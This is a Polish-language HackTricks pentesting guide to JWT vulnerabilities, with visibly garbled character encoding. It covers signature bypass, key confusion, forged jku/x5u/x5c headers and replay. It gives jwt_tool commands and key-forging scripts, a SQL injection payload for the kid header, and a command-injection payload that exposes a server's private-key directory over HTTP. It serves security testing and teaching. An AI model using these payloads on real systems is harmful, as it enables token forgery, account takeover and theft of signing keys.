# PodatnoÅ›ci JWT (Json Web Tokens)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**WskazÃ³wka dotyczÄ…ca bug bounty**: **zarejestruj siÄ™** na platformie **Intigriti**, premium **platformie bug bounty stworzonej przez hakerÃ³w, dla hakerÃ³w**! DoÅ‚Ä…cz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) juÅ¼ dziÅ› i zacznij zarabiaÄ‡ nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**CzÄ™Å›Ä‡ tego posta opiera siÄ™ na niesamowitym poÅ›cie:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor wspaniaÅ‚ego narzÄ™dzia do pentestowania JWT** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Szybkie ZwyciÄ™stwa**

Uruchom [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) w trybie `All Tests!` i czekaj na zielone linie
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
JeÅ›li masz szczÄ™Å›cie, narzÄ™dzie znajdzie przypadki, w ktÃ³rych aplikacja internetowa nieprawidÅ‚owo sprawdza JWT:

![](<../.gitbook/assets/image (435).png>)

NastÄ™pnie moÅ¼esz wyszukaÄ‡ Å¼Ä…danie w swoim proxy lub wydobyÄ‡ uÅ¼ywany JWT dla tego Å¼Ä…dania, uÅ¼ywajÄ…c narzÄ™dzia jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Modyfikacja danych bez zmieniania czegokolwiek

MoÅ¼esz po prostu zmieniaÄ‡ dane, pozostawiajÄ…c sygnaturÄ™ bez zmian i sprawdzaÄ‡, czy serwer sprawdza sygnaturÄ™. SprÃ³buj na przykÅ‚ad zmieniÄ‡ swojÄ… nazwÄ™ uÅ¼ytkownika na "admin".

#### **Czy token jest sprawdzany?**

Aby sprawdziÄ‡, czy sygnatura JWT jest weryfikowana:

- Komunikat o bÅ‚Ä™dzie sugeruje trwajÄ…cÄ… weryfikacjÄ™; wraÅ¼liwe szczegÃ³Å‚y w rozbudowanych bÅ‚Ä™dach powinny byÄ‡ sprawdzone.
- Zmiana na zwrÃ³conej stronie rÃ³wnieÅ¼ wskazuje na weryfikacjÄ™.
- Brak zmian sugeruje brak weryfikacji; wtedy moÅ¼na eksperymentowaÄ‡ z modyfikacjÄ… twierdzeÅ„ Å‚adunku.

### Pochodzenie

WaÅ¼ne jest ustalenie, czy token zostaÅ‚ wygenerowany po stronie serwera czy po stronie klienta, poprzez analizÄ™ historii Å¼Ä…daÅ„ proxy.

- Tokeny pochodzÄ…ce po raz pierwszy po stronie klienta sugerujÄ…, Å¼e klucz moÅ¼e byÄ‡ ujawniony w kodzie po stronie klienta, co wymaga dalszych badaÅ„.
- Tokeny pochodzÄ…ce po stronie serwera wskazujÄ… na bezpieczny proces.

### Czas trwania

SprawdÅº, czy token trwa dÅ‚uÅ¼ej niÅ¼ 24 godziny... moÅ¼e nigdy nie wygasaÄ‡. JeÅ›li istnieje pole "exp", sprawdÅº, czy serwer poprawnie je obsÅ‚uguje.

### Bruteforce tajnego HMAC

[**Zobacz tÄ™ stronÄ™.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Zmiana algorytmu na None (CVE-2015-9235)

Ustaw uÅ¼ywany algorytm jako "None" i usuÅ„ czÄ™Å›Ä‡ sygnatury.

UÅ¼yj rozszerzenia Burp o nazwie "JSON Web Token", aby wyprÃ³bowaÄ‡ tÄ™ podatnoÅ›Ä‡ i zmieniaÄ‡ rÃ³Å¼ne wartoÅ›ci wewnÄ…trz JWT (wyÅ›lij Å¼Ä…danie do Repeatera, a w zakÅ‚adce "JSON Web Token" moÅ¼esz modyfikowaÄ‡ wartoÅ›ci tokena. MoÅ¼esz rÃ³wnieÅ¼ wybraÄ‡ wartoÅ›Ä‡ pola "Alg" jako "None").

### Zmiana algorytmu RS256 (asymetryczny) na HS256 (symetryczny) (CVE-2016-5431/CVE-2016-10555)

Algorytm HS256 uÅ¼ywa tajnego klucza do podpisywania i weryfikowania kaÅ¼dej wiadomoÅ›ci.\
Algorytm RS256 uÅ¼ywa klucza prywatnego do podpisywania wiadomoÅ›ci i klucza publicznego do uwierzytelniania.

JeÅ›li zmienisz algorytm z RS256 na HS256, kod backendu uÅ¼yje klucza publicznego jako tajnego klucza, a nastÄ™pnie uÅ¼yje algorytmu HS256 do weryfikacji sygnatury.

NastÄ™pnie, korzystajÄ…c z klucza publicznego i zmieniajÄ…c RS256 na HS256, moÅ¼emy utworzyÄ‡ poprawnÄ… sygnaturÄ™. MoÅ¼esz pobraÄ‡ certyfikat serwera internetowego wykonujÄ…c to polecenie:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nowy klucz publiczny w nagÅ‚Ã³wku

AtakujÄ…cy umieszcza nowy klucz w nagÅ‚Ã³wku tokena, a serwer uÅ¼ywa tego nowego klucza do weryfikacji podpisu (CVE-2018-0114).

MoÅ¼na to zrobiÄ‡ za pomocÄ… rozszerzenia "JSON Web Tokens" w narzÄ™dziu Burp.\
(WyÅ›lij Å¼Ä…danie do Repeatera, w zakÅ‚adce JSON Web Token wybierz "CVE-2018-0114" i wyÅ›lij Å¼Ä…danie).

### Podrobienie JWKS

Instrukcje opisujÄ… metodÄ™ oceny bezpieczeÅ„stwa tokenÃ³w JWT, zwÅ‚aszcza tych, ktÃ³re wykorzystujÄ… nagÅ‚Ã³wek "jku". Ten nagÅ‚Ã³wek powinien zawieraÄ‡ odnoÅ›nik do pliku JWKS (JSON Web Key Set), ktÃ³ry zawiera klucz publiczny niezbÄ™dny do weryfikacji tokena.

- **Ocena tokenÃ³w z nagÅ‚Ã³wkiem "jku"**:
- SprawdÅº URL w nagÅ‚Ã³wku "jku", aby upewniÄ‡ siÄ™, Å¼e prowadzi do odpowiedniego pliku JWKS.
- Zmodyfikuj wartoÅ›Ä‡ "jku" w tokenie, aby skierowaÄ‡ jÄ… do kontrolowanego serwisu internetowego, umoÅ¼liwiajÄ…c obserwacjÄ™ ruchu.

- **Monitorowanie interakcji HTTP**:
- Obserwacja Å¼Ä…daÅ„ HTTP do okreÅ›lonego URL wskazuje na prÃ³by serwera pobrania kluczy z podanego linku.
- Podczas korzystania z narzÄ™dzia `jwt_tool` w tym procesie, waÅ¼ne jest zaktualizowanie pliku `jwtconf.ini` z lokalizacjÄ… osobistego pliku JWKS w celu uÅ‚atwienia testowania.

- **Polecenie dla `jwt_tool`**:
- Wykonaj poniÅ¼sze polecenie, aby zasymulowaÄ‡ scenariusz za pomocÄ… `jwt_tool`:
```bash
python3 jwt_tool.py JWT_TUTAJ -X s
```

### PrzeglÄ…d problemÃ³w z "kid"

Opcjonalny nagÅ‚Ã³wek o nazwie `kid` jest wykorzystywany do identyfikacji konkretnego klucza, co jest szczegÃ³lnie istotne w Å›rodowiskach, w ktÃ³rych istnieje wiele kluczy do weryfikacji podpisu tokena. Ten nagÅ‚Ã³wek pomaga w wyborze odpowiedniego klucza do weryfikacji podpisu tokena.

#### Ujawnienie klucza za pomocÄ… "kid"

Gdy nagÅ‚Ã³wek `kid` jest obecny, zaleca siÄ™ wyszukiwanie pliku o odpowiedniej nazwie lub jej wariantach w katalogu sieciowym. Na przykÅ‚ad, jeÅ›li jest okreÅ›lone `"kid":"key/12345"`, naleÅ¼y wyszukaÄ‡ pliki _/key/12345_ i _/key/12345.pem_ w gÅ‚Ã³wnym katalogu sieciowym.

#### Traversal Å›cieÅ¼ki za pomocÄ… "kid"

NagÅ‚Ã³wek `kid` moÅ¼e rÃ³wnieÅ¼ byÄ‡ wykorzystany do nawigacji po systemie plikÃ³w, co potencjalnie umoÅ¼liwia wybÃ³r dowolnego pliku. MoÅ¼liwe jest testowanie Å‚Ä…cznoÅ›ci lub wykonywanie atakÃ³w Server-Side Request Forgery (SSRF), zmieniajÄ…c wartoÅ›Ä‡ `kid`, aby celowaÄ‡ w konkretne pliki lub usÅ‚ugi. Zmiana wartoÅ›ci `kid` w JWT, zachowujÄ…c jednoczeÅ›nie oryginalny podpis, moÅ¼na osiÄ…gnÄ…Ä‡ za pomocÄ… flagi `-T` w narzÄ™dziu jwt_tool, jak pokazano poniÅ¼ej:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Poprzez celowanie w pliki o przewidywalnej zawartoÅ›ci moÅ¼liwe jest sfaÅ‚szowanie prawidÅ‚owego JWT. Na przykÅ‚ad plik `/proc/sys/kernel/randomize_va_space` w systemach Linux, ktÃ³ry zawiera wartoÅ›Ä‡ **2**, moÅ¼e byÄ‡ uÅ¼yty w parametrze `kid` z wartoÅ›ciÄ… **2** jako symetryczne hasÅ‚o do generowania JWT.

#### WstrzykniÄ™cie SQL poprzez "kid"

JeÅ›li zawartoÅ›Ä‡ claimu `kid` jest uÅ¼ywana do pobrania hasÅ‚a z bazy danych, moÅ¼liwe jest wykonanie ataku SQL injection poprzez modyfikacjÄ™ payloadu `kid`. PrzykÅ‚adowy payload wykorzystujÄ…cy SQL injection do zmiany procesu podpisywania JWT to:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Ta zmiana wymusza uÅ¼ycie znanego klucza tajnego, `ATTACKER`, do podpisywania JWT.

#### WstrzykniÄ™cie systemowe poprzez "kid"

W przypadku, gdy parametr `kid` okreÅ›la Å›cieÅ¼kÄ™ pliku uÅ¼ywanÄ… w kontekÅ›cie wykonania polecenia, moÅ¼e to prowadziÄ‡ do podatnoÅ›ci na zdalne wykonanie kodu (RCE). Poprzez wstrzykniÄ™cie poleceÅ„ do parametru `kid`, moÅ¼liwe jest ujawnienie kluczy prywatnych. PrzykÅ‚adowy payload umoÅ¼liwiajÄ…cy RCE i ujawnienie kluczy to:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u i jku

#### jku

jku oznacza **JWK Set URL**.\
JeÅ›li token uÅ¼ywa claimu nagÅ‚Ã³wka "**jku**", **sprawdÅº podany URL**. Powinien on wskazywaÄ‡ na URL zawierajÄ…cy plik JWKS, ktÃ³ry przechowuje klucz publiczny do weryfikacji tokena. Zmodyfikuj token tak, aby wartoÅ›Ä‡ jku wskazywaÅ‚a na usÅ‚ugÄ™ sieciowÄ…, dla ktÃ³rej moÅ¼na monitorowaÄ‡ ruch.

Najpierw musisz utworzyÄ‡ nowy certyfikat z nowymi kluczami prywatnymi i publicznymi.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
NastÄ™pnie moÅ¼esz uÅ¼yÄ‡ na przykÅ‚ad [**jwt.io**](https://jwt.io), aby utworzyÄ‡ nowy JWT z **utworzonymi kluczami publicznymi i prywatnymi oraz wskazujÄ…c parametr jku na utworzony certyfikat**. Aby utworzyÄ‡ waÅ¼ny certyfikat jku, moÅ¼esz pobraÄ‡ oryginalny i zmieniÄ‡ potrzebne parametry.

MoÅ¼esz uzyskaÄ‡ parametry "e" i "n" z certyfikatu publicznego, uÅ¼ywajÄ…c:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. Adres URI wskazujÄ…cy na zestaw publicznych certyfikatÃ³w X.509 (standard formatu certyfikatu) zakodowanych w formacie PEM. Pierwszy certyfikat w zestawie musi byÄ‡ uÅ¼ywany do podpisania tego JWT. Kolejne certyfikaty podpisujÄ… poprzedni, co koÅ„czy Å‚aÅ„cuch certyfikatÃ³w. X.509 jest zdefiniowany w RFC 52807. Wymagane jest zabezpieczenie transportu w celu przesÅ‚ania certyfikatÃ³w.

SprÃ³buj **zmieniÄ‡ ten nagÅ‚Ã³wek na URL pod TwojÄ… kontrolÄ…** i sprawdÅº, czy otrzymujesz jakieÅ› Å¼Ä…danie. W takim przypadku **moÅ¼esz zmodyfikowaÄ‡ JWT**.

Aby sfaÅ‚szowaÄ‡ nowy token, uÅ¼ywajÄ…c certyfikatu kontrolowanego przez Ciebie, musisz utworzyÄ‡ certyfikat i wyodrÄ™bniÄ‡ klucze publiczny i prywatny:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
NastÄ™pnie moÅ¼esz uÅ¼yÄ‡ na przykÅ‚ad [**jwt.io**](https://jwt.io), aby utworzyÄ‡ nowy JWT z **utworzonymi kluczami publicznymi i prywatnymi oraz wskazujÄ…c parametr x5u na utworzony certyfikat .crt**.

![](<../.gitbook/assets/image (439).png>)

MoÅ¼esz rÃ³wnieÅ¼ wykorzystaÄ‡ obie te podatnoÅ›ci **do atakÃ³w SSRF**.

#### x5c

Ten parametr moÅ¼e zawieraÄ‡ **certyfikat w formacie base64**:

![](<../.gitbook/assets/image (440).png>)

JeÅ›li atakujÄ…cy **wygeneruje samopodpisany certyfikat** i utworzy sfaÅ‚szowany token, uÅ¼ywajÄ…c odpowiadajÄ…cego klucza prywatnego, a nastÄ™pnie zastÄ…pi wartoÅ›Ä‡ parametru "x5c" nowo wygenerowanym certyfikatem i zmodyfikuje inne parametry, tj. n, e i x5t, to serwer w zasadzie zaakceptuje sfaÅ‚szowany token.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Osadzony klucz publiczny (CVE-2018-0114)

JeÅ›li JWT zawiera osadzony klucz publiczny, jak w poniÅ¼szym scenariuszu:

![](<../.gitbook/assets/image (438).png>)

Za pomocÄ… poniÅ¼szego skryptu w jÄ™zyku Node.js moÅ¼na wygenerowaÄ‡ klucz publiczny na podstawie tych danych:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
MoÅ¼liwe jest wygenerowanie nowego klucza prywatnego/publicznego, osadzenie nowego klucza publicznego wewnÄ…trz tokena i uÅ¼ycie go do wygenerowania nowego podpisu:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
MoÅ¼esz uzyskaÄ‡ wartoÅ›ci "n" i "e" za pomocÄ… tego skryptu w Node.js:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Wreszcie, uÅ¼ywajÄ…c klucza publicznego i prywatnego oraz nowych wartoÅ›ci "n" i "e", moÅ¼esz uÅ¼yÄ‡ [jwt.io](https://jwt.io), aby sfaÅ‚szowaÄ‡ nowy waÅ¼ny JWT z dowolnymi informacjami.

### JTI (JWT ID)

Twierdzenie JTI (JWT ID) zapewnia unikalny identyfikator dla tokenu JWT. MoÅ¼e byÄ‡ uÅ¼ywany do zapobiegania odtwarzaniu tokenu.\
Jednak wyobraÅº sobie sytuacjÄ™, w ktÃ³rej maksymalna dÅ‚ugoÅ›Ä‡ identyfikatora wynosi 4 (0001-9999). Å»Ä…danie 0001 i 10001 bÄ™dzie uÅ¼ywaÄ‡ tego samego identyfikatora. JeÅ›li serwer backendowy zwiÄ™ksza identyfikator przy kaÅ¼dym Å¼Ä…daniu, moÅ¼na to wykorzystaÄ‡ do **odtwarzania Å¼Ä…dania** (konieczne jest wysÅ‚anie 10000 Å¼Ä…daÅ„ miÄ™dzy kaÅ¼dym udanym odtworzeniem).

### Zarejestrowane twierdzenia JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Inne ataki

**Ataki przekazywania miÄ™dzyusÅ‚ugowego**

ZauwaÅ¼ono, Å¼e niektÃ³re aplikacje internetowe polegajÄ… na zaufanym usÅ‚udze JWT do generowania i zarzÄ…dzania swoimi tokenami. ZdarzaÅ‚y siÄ™ przypadki, gdy token wygenerowany dla jednego klienta przez usÅ‚ugÄ™ JWT zostaÅ‚ zaakceptowany przez innego klienta tej samej usÅ‚ugi JWT. JeÅ›li zaobserwowano wydanie lub odnowienie JWT za poÅ›rednictwem usÅ‚ugi innej firmy, naleÅ¼y zbadaÄ‡ moÅ¼liwoÅ›Ä‡ zarejestrowania siÄ™ na innym kliencie tej usÅ‚ugi za pomocÄ… tego samego nazwy uÅ¼ytkownika/adresu e-mail. NastÄ™pnie naleÅ¼y sprÃ³bowaÄ‡ odtworzyÄ‡ uzyskany token w Å¼Ä…daniu do celu, aby sprawdziÄ‡, czy jest akceptowany.

- Akceptacja twojego tokenu moÅ¼e wskazywaÄ‡ na istnienie powaÅ¼nego problemu, ktÃ³ry potencjalnie umoÅ¼liwia podszywanie siÄ™ pod dowolne konto uÅ¼ytkownika. NaleÅ¼y jednak zauwaÅ¼yÄ‡, Å¼e moÅ¼e byÄ‡ konieczne uzyskanie zgody na szersze testowanie, jeÅ›li chodzi o rejestracjÄ™ w aplikacji innej firmy, poniewaÅ¼ moÅ¼e to wprowadziÄ‡ w szarÄ… strefÄ™ prawnÄ….

**Sprawdzanie waÅ¼noÅ›ci tokenÃ³w**

WaÅ¼noÅ›Ä‡ tokenu jest sprawdzana za pomocÄ… twierdzenia "exp" w Å‚adunku. PoniewaÅ¼ JWT czÄ™sto sÄ… uÅ¼ywane bez informacji o sesji, wymaga siÄ™ ostroÅ¼nego postÄ™powania. W wielu przypadkach przechwycenie i odtworzenie tokenu innego uÅ¼ytkownika moÅ¼e umoÅ¼liwiÄ‡ podszywanie siÄ™ pod tego uÅ¼ytkownika. RFC JWT zaleca Å‚agodzenie atakÃ³w powtÃ³rnego odtwarzania JWT poprzez wykorzystanie twierdzenia "exp" do ustawienia czasu waÅ¼noÅ›ci tokenu. Ponadto, waÅ¼ne jest, aby aplikacja wdroÅ¼yÅ‚a odpowiednie sprawdzenia w celu zapewnienia przetwarzania tej wartoÅ›ci i odrzucania wygasÅ‚ych tokenÃ³w. JeÅ›li token zawiera twierdzenie "exp" i limity czasu testowania na to pozwalajÄ…, zaleca siÄ™ przechowywanie tokenu i odtwarzanie go po upÅ‚ywie czasu waÅ¼noÅ›ci. ZawartoÅ›Ä‡ tokenu, w tym analiza znacznikÃ³w czasowych i sprawdzanie waÅ¼noÅ›ci (znacznik czasu w formacie UTC), moÅ¼na odczytaÄ‡ za pomocÄ… flagi -R narzÄ™dzia jwt_tool.

- Istnieje ryzyko bezpieczeÅ„stwa, jeÅ›li aplikacja wciÄ…Å¼ sprawdza waÅ¼noÅ›Ä‡ tokenu, poniewaÅ¼ moÅ¼e to sugerowaÄ‡, Å¼e token nigdy nie wygaÅ›nie.


### NarzÄ™dzia

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**WskazÃ³wka dotyczÄ…ca bug bounty**: **zarejestruj siÄ™** na platformie **Intigriti**, premium **platformie bug bounty stworzonej przez hakerÃ³w, dla hakerÃ³w**! DoÅ‚Ä…cz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) juÅ¼ dziÅ› i zacznij zarabiaÄ‡ nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
